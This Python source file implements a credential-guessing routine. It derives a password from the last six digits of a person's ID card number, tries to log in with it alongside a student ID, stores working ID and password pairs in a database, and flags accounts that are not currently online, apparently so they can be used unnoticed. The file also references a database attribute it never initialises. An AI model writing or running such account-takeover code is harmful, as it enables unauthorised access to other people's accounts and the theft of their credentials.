from verifyspider import VerifySpider
from infoparser import InfoParser
from db import DB


class Func(object):

    def __init__(self):
        self.spider = VerifySpider()
        self.parser = InfoParser()

    def check_all(self,sid,idcard):
        if idcard:
            if  idcard[-1] == 'X' or idcard[-1] == 'x':
                password = idcard[-7:-1]
            else:
                password = idcard[-6:]
        else:
            return False
        html = self.spider.req_login(sid,password)
        if self.parser.check_login(html):
            self.db.insert_info(sid,password)
            html = self.spider.req_info()
            self.parser.check_online(html)
            if not self.parser.online_count:
                print(sid[3:],password,self.parser.online_count)
                return True
        return False

    def check(self,sid,password):
        html = self.spider.req_login(sid,password)
        if self.parser.check_login(html):
            html = self.spider.req_info()
            self.parser.check_online(html)
            if not self.parser.online_count:
                print(sid,password,self.parser.online_count)
                return True
        return False
